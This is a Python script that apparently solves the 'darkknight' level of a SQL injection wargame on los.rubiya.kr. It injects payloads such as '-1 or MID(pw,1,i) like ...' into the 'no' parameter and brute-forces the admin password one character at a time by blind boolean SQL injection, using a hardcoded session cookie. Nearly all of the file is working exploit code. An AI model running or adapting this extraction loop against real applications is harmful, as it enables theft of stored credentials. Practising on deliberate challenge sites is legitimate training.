import requests as req
import string
import threading

url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php";

cookie = {
    "PHPSESSID":"rfmgrhnj5qs7jtv1f0h4avll7d"
}



r = req.get(url,cookies=cookie)

# Find the length of the password
def get_passlength():
    for i in range(1,10):
        res = req.get(url,params={"no":f"-1 or length(pw) like {i} --"},cookies=cookie);
        print(f"Sent request {res.url}")
        if "Hello admin" in res.text:
            print(f"The length of password is {i}");
            break;
# Got the length as 8


def get_pass():
    '''
    select id from prob where id='guest' and pw='' and no=-1 or MID(pw,1,1) like 'i' ;
    +-------+
    | id    |
    +-------+
    | admin |
    +-------+
    '''
    pas = "";
    for i in range(1,9):
        for j in range(ord('0'),ord('z')):
            res = req.get(url,params={"no":f"-1 or MID(pw,1,{i}) like \"{pas+chr(j)}\"  --"},cookies=cookie,verify=False);
            if "Hello admin" in res.text:
                pas += chr(j)
                print(f"Got a character {j}");
                break;
            """  else:
                res = req.get(url,params={"no":f"-1 or MID(pw,{i},1) like {j}  --"},cookies=cookie,verify=False);
                if "Hello admin" in res.text:
                    pas += chr(j)
                    print(f"Got a character {j}");
                    break; """

            
    print(pas)

if __name__ == '__main__':
    #threading.Thread(target=get_passlength).start()
    get_pass();

# SQL is left to right associative

# Cleared